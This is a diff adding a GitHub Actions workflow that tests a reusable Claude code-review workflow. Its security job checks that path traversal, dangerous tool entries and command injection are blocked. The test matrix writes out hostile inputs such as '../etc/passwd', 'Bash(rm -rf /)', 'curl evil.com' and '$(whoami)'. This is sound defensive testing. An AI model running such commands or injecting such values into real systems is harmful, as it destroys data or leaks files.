@@ -1,0 +1,311 @@
+name: Test Code Review Workflow
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+    paths:
+      - ".github/workflows/_review-code.yml"
+      - ".github/workflows/test-review-code.yml"
+  push:
+    branches:
+      - "main"
+  workflow_dispatch:
+    inputs:
+      test_scenario:
+        description: 'Test scenario to run (all, basic, custom-prompt, security)'
+        required: false
+        type: choice
+        options:
+          - all
+          - basic
+          - custom-prompt
+          - security
+        default: 'all'
+
+permissions: {}
+
+env:
+  _TEST_MALICIOUS_PATH: "../etc/passwd"
+  _TEST_DANGEROUS_TOOL: 'mcp__test,Bash(rm -rf /)'
+  _TEST_INJECTION_TITLE: 'Test $(whoami) injection'
+  _TEST_FILE_SIZE_LIMIT: 102400
+
+jobs:
+  # Functional tests - test the reusable workflow with various configurations
+  test-workflow-configurations:
+    name: Test Workflow - ${{ matrix.test-name }}
+    if: |
+      github.event_name == 'push' ||
+      github.event_name == 'pull_request' ||
+      (github.event_name == 'workflow_dispatch' && (inputs.test_scenario == 'all' || inputs.test_scenario == 'basic' || inputs.test_scenario == 'custom-prompt'))
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - test-name: "Default Config"
+            custom_prompt_path: ".claude/prompts/review-additions.md"
+            allowed_tools: "mcp__github_comment__update_claude_comment,mcp__github_inline_comment__create_inline_comment,Bash(gh pr diff:*),Bash(gh pr view:*)"
+          - test-name: "Custom Prompt"
+            custom_prompt_path: ".claude/prompts/test-additions.md"
+            allowed_tools: "mcp__github_comment__update_claude_comment,mcp__github_inline_comment__create_inline_comment,Bash(gh pr diff:*),Bash(gh pr view:*)"
+          - test-name: "Minimal Tools"
+            custom_prompt_path: ".claude/prompts/review-additions.md"
+            allowed_tools: "mcp__github_comment__update_claude_comment"
+    uses: ./.github/workflows/_review-code.yml
+    permissions:
+      contents: read
+      id-token: write
+      pull-requests: write
+    secrets:
+      ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+    with:
+      custom_prompt_path: ${{ matrix.custom_prompt_path }}
+      allowed_tools: ${{ matrix.allowed_tools }}
+
+  # Security validation tests
+  validate-security-controls:
+    name: Validate Security Controls
+    if: |
+      github.event_name == 'push' ||
+      github.event_name == 'pull_request' ||
+      (github.event_name == 'workflow_dispatch' && (inputs.test_scenario == 'all' || inputs.test_scenario == 'security'))
+    runs-on: ubuntu-24.04
+    permissions:
+      contents: read
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - test-name: "Path Traversal - Parent Directory"
+            test-type: "path-traversal"
+            malicious-input: "../etc/passwd"
+          - test-name: "Path Traversal - Absolute Path"
+            test-type: "path-traversal"
+            malicious-input: "/etc/passwd"
+          - test-name: "Path Traversal - Double Dot"
+            test-type: "path-traversal"
+            malicious-input: ".claude/../../../etc/passwd"
+          - test-name: "Tools - Dangerous Bash Command"
+            test-type: "tools-validation"
+            malicious-input: "mcp__test,Bash(rm -rf /)"
+          - test-name: "Tools - Shell Semicolon"
+            test-type: "tools-validation"
+            malicious-input: "mcp__test;curl evil.com"
+          - test-name: "Tools - Command Substitution"
+            test-type: "tools-validation"
+            malicious-input: "mcp__test,Bash($(whoami))"
+          - test-name: "Injection - Command Substitution"
+            test-type: "command-injection"
+            malicious-input: "Test $(whoami) injection"
+          - test-name: "Injection - Backtick Execution"
+            test-type: "command-injection"
+            malicious-input: "Test `whoami` injection"
+          - test-name: "Injection - Newline Escape"
+            test-type: "command-injection"
+            malicious-input: "Test\\ncurl evil.com"
+          - test-name: "File Size - Exceeds Limit"
+            test-type: "file-size"
+            file-size-kb: 200
+    outputs:
+      path-traversal-parent-status: ${{ steps.set-status.outputs.path-traversal-parent }}
+      path-traversal-absolute-status: ${{ steps.set-status.outputs.path-traversal-absolute }}
+      path-traversal-double-status: ${{ steps.set-status.outputs.path-traversal-double }}
+      tools-dangerous-bash-status: ${{ steps.set-status.outputs.tools-dangerous-bash }}
+      tools-shell-semicolon-status: ${{ steps.set-status.outputs.tools-shell-semicolon }}
+      tools-command-sub-status: ${{ steps.set-status.outputs.tools-command-sub }}
+      injection-command-sub-status: ${{ steps.set-status.outputs.injection-command-sub }}
+      injection-backtick-status: ${{ steps.set-status.outputs.injection-backtick }}
+      injection-newline-status: ${{ steps.set-status.outputs.injection-newline }}
+      file-size-status: ${{ steps.set-status.outputs.file-size }}
+
+    steps:
+      - name: Check out repo
+        uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5.0.0
+
+      - name: Test ${{ matrix.test-name }}
+        id: run-test
+        continue-on-error: true
+        run: |
+          case "${{ matrix.test-type }}" in
+            "path-traversal")
+              CUSTOM_PATH="${{ matrix.malicious-input }}"
+
+              # Test path must start with .claude/
+              if [[ ! "$CUSTOM_PATH" =~ ^\.claude/ ]]; then
+                echo "✅ PASS: Path blocked (not in .claude/)"
+                exit 0
+              fi
+
+              # Test no .. sequences allowed
+              if [[ "$CUSTOM_PATH" =~ \.\. ]]; then
+                echo "✅ PASS: Path blocked (contains ..)"
+                exit 0
+              fi
+
+              echo "❌ FAIL: Path traversal not blocked: $CUSTOM_PATH"
+              exit 1
+              ;;
+
+            "tools-validation")
+              ALLOWED_TOOLS="${{ matrix.malicious-input }}"
+
+              # Test character allowlist
+              if [[ ! "$ALLOWED_TOOLS" =~ ^[a-zA-Z0-9_,\(\):\*\-\[\]\ ]+$ ]]; then
+                echo "✅ PASS: Invalid characters blocked"
+                exit 0
+              fi
+
+              # Test shell metacharacters
+              if [[ "$ALLOWED_TOOLS" =~ (\;|\$|\`|\||\\) ]]; then
+                echo "✅ PASS: Shell metacharacters blocked"
+                exit 0
+              fi
+
+              # Test gh-only enforcement for Bash commands
+              if echo "$ALLOWED_TOOLS" | grep -q 'Bash('; then
+                bash_commands=$(echo "$ALLOWED_TOOLS" | grep -oE 'Bash\([^)]+\)' | sed 's/Bash(\(.*\))/\1/')
+                while IFS= read -r cmd; do
+                  if [[ -n "$cmd" ]] && [[ ! "$cmd" =~ ^gh\  ]]; then
+                    echo "✅ PASS: Non-gh Bash command blocked: $cmd"
+                    exit 0
+                  fi
+                done <<< "$bash_commands"
+              fi
+
+              echo "❌ FAIL: Dangerous tool not blocked: $ALLOWED_TOOLS"
+              exit 1
+              ;;
+
+            "command-injection")
+              TEST_INPUT="${{ matrix.malicious-input }}"
+
+              # Test printf safety - should treat input as literal string
+              OUTPUT=$(printf "TITLE: %s\n" "$TEST_INPUT")
+
+              # Check that dangerous patterns are NOT expanded
+              if [[ "$OUTPUT" == *'$('* ]] || [[ "$OUTPUT" == *'`'* ]]; then
+                echo "✅ PASS: Command substitution not executed"
+                echo "Output: $OUTPUT"
+                exit 0
+              fi
+
+              echo "❌ FAIL: Command injection may be possible"
+              exit 1
+              ;;
+
+            "file-size")
+              # Create test file that exceeds limit
+              mkdir -p .claude/prompts
+              dd if=/dev/zero of=.claude/prompts/huge-file.md bs=1024 count=${{ matrix.file-size-kb }} 2>/dev/null
+
+              CUSTOM_PATH=".claude/prompts/huge-file.md"
+              FILE_SIZE=$(stat -c%s "$CUSTOM_PATH" 2>/dev/null || stat -f%z "$CUSTOM_PATH" 2>/dev/null)
+
+              if [ -z "$FILE_SIZE" ] || ! [[ "$FILE_SIZE" =~ ^[0-9]+$ ]]; then
+                echo "❌ FAIL: Cannot determine file size"
+                exit 1
+              fi
+
+              if [ "$FILE_SIZE" -gt "$_TEST_FILE_SIZE_LIMIT" ]; then
+                echo "✅ PASS: File size limit enforced (${FILE_SIZE} bytes > ${_TEST_FILE_SIZE_LIMIT})"
+                exit 0
+              fi
+
+              echo "❌ FAIL: File size limit not enforced"
+              exit 1
+              ;;
+
+            *)
+              echo "❌ FAIL: Unknown test type: ${{ matrix.test-type }}"
+              exit 1
+              ;;
+          esac
+
+      - name: Set Status
+        id: set-status
+        run: |
+          # Create a safe output key from test name
+          output_key=$(echo "${{ matrix.test-name }}" | sed 's/[^a-zA-Z0-9]/-/g' | tr '[:upper:]' '[:lower:]' | sed 's/--*/-/g')
+          echo "${output_key}=${{ steps.run-test.outcome }}" >> $GITHUB_OUTPUT
+          echo "Test: ${{ matrix.test-name }} - Status: ${{ steps.run-test.outcome }}"
+
+  # Validation job - aggregates all test results
+  validate-test-results:
+    name: Validate All Test Results
+    runs-on: ubuntu-24.04
+    needs: [validate-security-controls]
+    if: always()
+    permissions:
+      contents: read
+    steps:
+      - name: Validate Security Test Results
+        run: |
+          echo "## Security Validation Results"
+          echo ""
+
+          # Helper function for assertions
+          assert_test() {
+            local test_name="$1"
+            local actual_status="$2"
+            local expected_status="success"
+
+            if [[ "$actual_status" == "$expected_status" ]]; then
+              echo "✅ PASS: $test_name"
+              return 0
+            else
+              echo "❌ FAIL: $test_name (expected: $expected_status, got: $actual_status)"
+              return 1
+            fi
+          }
+
+          # Track overall status
+          failed_tests=0
+
+          # Path Traversal Tests
+          echo "### Path Traversal Protection"
+          assert_test "Parent Directory Traversal" "${{ needs.validate-security-controls.outputs.path-traversal-parent-status }}" || ((failed_tests++))
+          assert_test "Absolute Path Traversal" "${{ needs.validate-security-controls.outputs.path-traversal-absolute-status }}" || ((failed_tests++))
+          assert_test "Double Dot Traversal" "${{ needs.validate-security-controls.outputs.path-traversal-double-status }}" || ((failed_tests++))
+          echo ""
+
+          # Tools Validation Tests
+          echo "### Tools Validation"
+          assert_test "Dangerous Bash Command" "${{ needs.validate-security-controls.outputs.tools-dangerous-bash-status }}" || ((failed_tests++))
+          assert_test "Shell Semicolon" "${{ needs.validate-security-controls.outputs.tools-shell-semicolon-status }}" || ((failed_tests++))
+          assert_test "Command Substitution in Tools" "${{ needs.validate-security-controls.outputs.tools-command-sub-status }}" || ((failed_tests++))
+          echo ""
+
+          # Command Injection Tests
+          echo "### Command Injection Protection"
+          assert_test "Command Substitution" "${{ needs.validate-security-controls.outputs.injection-command-sub-status }}" || ((failed_tests++))
+          assert_test "Backtick Execution" "${{ needs.validate-security-controls.outputs.injection-backtick-status }}" || ((failed_tests++))
+          assert_test "Newline Escape" "${{ needs.validate-security-controls.outputs.injection-newline-status }}" || ((failed_tests++))
+          echo ""
+
+          # File Size Tests
+          echo "### File Size Validation"
+          assert_test "File Size Limit" "${{ needs.validate-security-controls.outputs.file-size-status }}" || ((failed_tests++))
+          echo ""
+
+          # Final verdict
+          if [ $failed_tests -gt 0 ]; then
+            echo "❌ $failed_tests security test(s) failed"
+            exit 1
+          fi
+
+          echo "✅ All security tests passed"
+
+  # Integration test - verifies end-to-end workflow execution
+  integration-test:
+    name: Integration Test
+    if: github.event_name == 'pull_request'
+    needs: [test-workflow-configurations]
+    runs-on: ubuntu-24.04
+    permissions:
+      contents: read
+
+    steps:
+      - name: Verify workflow execution
+        run: |
+          echo "✅ Workflow configurations tested successfully"
+          echo "Integration test passed: Reusable workflow executes without errors"
